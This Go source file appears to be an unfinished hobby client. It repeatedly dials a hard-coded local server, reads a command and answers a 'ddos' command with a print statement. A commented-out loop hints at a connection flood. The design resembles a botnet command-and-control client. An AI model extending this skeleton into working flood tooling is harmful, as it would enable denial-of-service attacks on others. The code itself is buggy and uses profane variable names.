package main

import ("fmt"
	"net"
)

func main() {
	
	looper: for {
		conn, err := net.Dial("tcp", "192.168.1.33:8080")
		//if error doesnt equal nil it continues looping looper until it connects
		if err != nil {
			fmt.Println("error")
			continue looper
		}
		//else if conn connects the rest of the code runs

		defer conn.Close()

	/*buffer := make([]byte, 1024)
	n, er := conn.Read(buffer)
	if er != nil {
		fmt.Println("error")
		return
	}
	
	fmt.Println("Server says:", string(buffer[:n]))	
	//fuck is whatever the server says. 
	fuck := string(buffer[:n])*/
	fuck := formServerResponse(conn)
	fmt.Println("server says", fuck)

	switch fuck {
		case "fuck":
			fmt.Println("fuck you too")
		case "ddos":
			fmt.Println("ddos activated")
		//	conn.Write([]byte("test deez nuts"))

	}
		//port := 8080
	
		/*for i := 1; i <= 90; i++ {

                	address := fmt.Sprintf("%s:%d", fuck, port)

                	conn, err := net.Dial("tcp", address)

                	if err == nil {
        			fmt.Println("Sent")
        		        conn.Close()
        		}

        		if err != nil {
        		        fmt.Println("closed")
        		        break
        		}
		}*/
	}
}

func formServerResponse(conn net.Conn) string {

	buffer := make([]byte, 1024)
        n, er := conn.Read(buffer)
        if er != nil {
                fmt.Println("error")
                //return
        }

        //fmt.Println("Server says:", string(buffer[:n]))
        //fuck is whatever the server says.
        fuck := string(buffer[:n])
	return fuck

}
